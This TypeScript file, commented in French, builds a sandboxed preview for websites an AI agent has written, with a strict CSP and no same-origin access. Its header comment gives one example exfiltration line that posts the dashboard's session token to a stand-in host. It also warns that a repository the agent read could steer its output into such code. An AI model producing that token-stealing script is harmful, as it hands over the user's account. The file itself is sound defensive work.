// L'Aperçu — voir ce que l'IA construit, sans lui donner la session.
//
// ─── LE POINT DUR, ET IL FAUT LE POSER AVANT TOUT LE RESTE ───────────────────
//
// Prévisualiser un site que l'agent vient d'écrire, c'est EXÉCUTER DANS LE
// NAVIGATEUR DE L'HÔTE du HTML et du JavaScript que l'hôte n'a pas relus. Servis
// en même origine que le tableau de bord, trois lignes suffisent :
//
//     fetch('https://ailleurs/', {method:'POST', body: localStorage['hive.jwt']})
//
// …et celui qui reçoit devient l'administrateur de la ruche. Ce n'est pas une
// hypothèse tordue : le contenu vient d'un modèle qui a lu le dépôt, et le dépôt
// peut être public.
//
// ─── LES QUATRE MURS, ET POURQUOI IL EN FAUT QUATRE ──────────────────────────
//
//   1. ORIGINE OPAQUE. L'aperçu s'affiche dans une `<iframe sandbox>` SANS
//      `allow-same-origin`. Le cadre obtient alors une origine unique et
//      inaccessible : il ne peut lire ni le `localStorage` du tableau de bord,
//      ni ses cookies, ni même un stockage à lui. C'est le mur qui compte ; les
//      trois autres sont de la défense en profondeur.
//   2. AUCUN IDENTIFIANT NE CIRCULE. Le document est assemblé côté hôte, déjà
//      authentifié, et injecté par `srcdoc`. Le cadre ne fait AUCUNE requête à
//      la ruche, donc n'a aucune occasion de porter un jeton. (La ruche
//      s'authentifie par en-tête, jamais par cookie : rien ne partirait tout
//      seul de toute façon — mais on ne s'appuie pas sur cette chance.)
//   3. RÉSEAU COUPÉ. Une `Content-Security-Policy` insérée en tête du document
//      interdit `connect-src`, `form-action` et les sources externes. Même si
//      le cadre n'a rien de secret à voler, il ne doit pas pouvoir appeler
//      dehors : ce serait une balise de traçage dans le navigateur de l'hôte,
//      et un canal pour recevoir des instructions.
//   4. AUCUNE NAVIGATION. Pas de `allow-top-navigation`, pas de `allow-popups`,
//      pas de `allow-forms` : un aperçu qui peut remplacer la page par une
//      fausse mire de connexion est un hameçonnage servi depuis le domaine de
//      confiance de l'utilisateur.
//
// ─── POURQUOI UN DOCUMENT AUTO-SUFFISANT ─────────────────────────────────────
//
// Un cadre en origine opaque et sans réseau ne peut PAS charger
// `<link href="style.css">` ni `<script src="app.js">`. Il faut donc replier le
// site en UN seul document : les feuilles et les scripts sont recopiés à
// l'intérieur.
//
// C'est aussi ce qui rend l'aperçu honnête : ce qui s'affiche est exactement ce
// que le dépôt contient, sans qu'aucune requête ne parte ailleurs.

import { cheminDemande } from './rayon.js';

/** L'aperçu ne dépasse pas ça. Au-delà, on refuse plutôt que de figer l'onglet. */
export const MAX_APERCU = 2 * 1024 * 1024;

/** Les points d'entrée cherchés, dans l'ordre. */
export const ENTREES_APERCU = [
  'index.html',
  'public/index.html',
  'dist/index.html',
  'site/index.html',
] as const;

/**
 * La politique injectée en tête de chaque aperçu.
 *
 * `default-src 'none'` d'abord : tout est refusé, puis on rouvre le strict
 * nécessaire à un rendu. `connect-src 'none'` et `form-action 'none'` sont les
 * deux qui coupent la sortie — sans eux, un aperçu pourrait appeler dehors.
 *
 * `'unsafe-inline'` est là parce que tout est inline PAR CONSTRUCTION : c'est le
 * prix du document auto-suffisant, et il est payé dans une origine opaque, sans
 * réseau et sans navigation. Le seul code qu'il autorise est celui qu'on
 * affiche exprès.
 */
export const CSP_APERCU = [
  "default-src 'none'",
  'img-src data: blob:',
  'font-src data:',
  "style-src 'unsafe-inline'",
  "script-src 'unsafe-inline'",
  "connect-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
].join('; ');

/**
 * Les attributs `sandbox` de l'iframe.
 *
 * **`allow-same-origin` N'Y EST PAS, ET N'Y SERA JAMAIS.** L'ajouter rendrait au
 * cadre l'origine du tableau de bord, donc l'accès au `localStorage` où vit le
 * jeton de session. C'est le seul attribut dont la présence transformerait cet
 * aperçu en prise de compte.
 */
export const SANDBOX_APERCU = 'allow-scripts';

export type RefusApercu = 'pas_de_page' | 'trop_gros';

export type Apercu =
  | { ok: true; html: string; entree: string; inlines: string[] }
  | { ok: false; refus: RefusApercu; motif: string };

/** Résout un chemin relatif depuis le dossier du document. */
function resoudre(base: string, ref: string): string | null {
  // Une URL absolue ou protocole-relative désigne l'extérieur : on ne l'inline
  // pas, et la politique la bloquera à l'affichage. La laisser telle quelle est
  // plus honnête que la retirer en silence.
  if (/^[a-z][a-z0-9+.-]*:/i.test(ref) || ref.startsWith('//')) return null;
  if (ref.startsWith('#') || ref.trim() === '') return null;
  const sansAncre = ref.split('#')[0]!.split('?')[0]!;
  if (sansAncre === '') return null;
  const dossier = base.includes('/') ? base.slice(0, base.lastIndexOf('/')) : '';
  const joint = sansAncre.startsWith('/')
    ? sansAncre.slice(1)
    : dossier === ''
      ? sansAncre
      : `${dossier}/${sansAncre}`;
  // On repasse par la règle du Rayon : `../../.env` ne devient pas une feuille
  // de style parce qu'il est écrit dans un attribut `href`.
  const v = cheminDemande(joint);
  return v.ok ? v.relatif : null;
}

/** Échappe ce qui pourrait fermer une balise `<style>` ou `<script>`. */
function sansFermeture(contenu: string, balise: 'style' | 'script'): string {
  // Un fichier CSS ou JS contenant `</script>` refermerait la balise et le
  // reste serait interprété comme du HTML — c'est l'échappatoire classique de
  // l'inlining, et elle ne coûte qu'une ligne à fermer.
  return contenu.replace(new RegExp(`</(${balise})`, 'gi'), `<\\/$1`);
}

/**
 * Replie un ensemble de fichiers en UN document auto-suffisant.
 *
 * `fichiers` associe un chemin relatif à son contenu. Ce qui manque n'est pas
 * une erreur : la balise reste telle quelle, et la politique s'occupera de la
 * bloquer. Un aperçu incomplet vaut mieux qu'un refus sur un fichier absent.
 */
export function assemblerApercu(
  fichiers: ReadonlyMap<string, string>,
  entreePreferee?: string,
): Apercu {
  const entree =
    (entreePreferee && fichiers.has(entreePreferee) ? entreePreferee : undefined) ??
    ENTREES_APERCU.find((e) => fichiers.has(e));
  if (!entree) {
    return {
      ok: false,
      refus: 'pas_de_page',
      motif:
        'Aucune page à prévisualiser : il faut un index.html à la racine, ou dans public/, dist/ ou site/.',
    };
  }

  let html = fichiers.get(entree)!;
  const inlines: string[] = [];

  // Les feuilles de style.
  html = html.replace(/<link\b[^>]*\brel\s*=\s*["']?stylesheet["']?[^>]*>/gi, (balise) => {
    const href = /\bhref\s*=\s*["']([^"']+)["']/i.exec(balise)?.[1];
    const cible = href ? resoudre(entree, href) : null;
    const contenu = cible ? fichiers.get(cible) : undefined;
    if (contenu === undefined) return balise;
    inlines.push(cible!);
    return `<style>\n${sansFermeture(contenu, 'style')}\n</style>`;
  });

  // Les scripts.
  html = html.replace(
    /<script\b([^>]*)\bsrc\s*=\s*["']([^"']+)["']([^>]*)>\s*<\/script>/gi,
    (balise, _avant: string, src: string) => {
      const cible = resoudre(entree, src);
      const contenu = cible ? fichiers.get(cible) : undefined;
      if (contenu === undefined) return balise;
      inlines.push(cible!);
      // Le `type` d'origine est conservé : un module reste un module.
      const type = /\btype\s*=\s*["']([^"']+)["']/i.exec(balise)?.[1];
      const attrs = type ? ` type="${type}"` : '';
      return `<script${attrs}>\n${sansFermeture(contenu, 'script')}\n</script>`;
    },
  );

  // LA POLITIQUE EN PREMIER, toujours. Placée après un script, elle ne
  // s'appliquerait pas à lui — et c'est précisément à lui qu'on veut qu'elle
  // s'applique.
  const meta = `<meta http-equiv="Content-Security-Policy" content="${CSP_APERCU}">`;
  html = /<head\b[^>]*>/i.test(html)
    ? html.replace(/<head\b[^>]*>/i, (t) => `${t}\n${meta}`)
    : `${meta}\n${html}`;

  if (html.length > MAX_APERCU) {
    return {
      ok: false,
      refus: 'trop_gros',
      motif: 'La page assemblée dépasse 2 Mo — trop lourde pour un aperçu.',
    };
  }
  return { ok: true, html, entree, inlines };
}
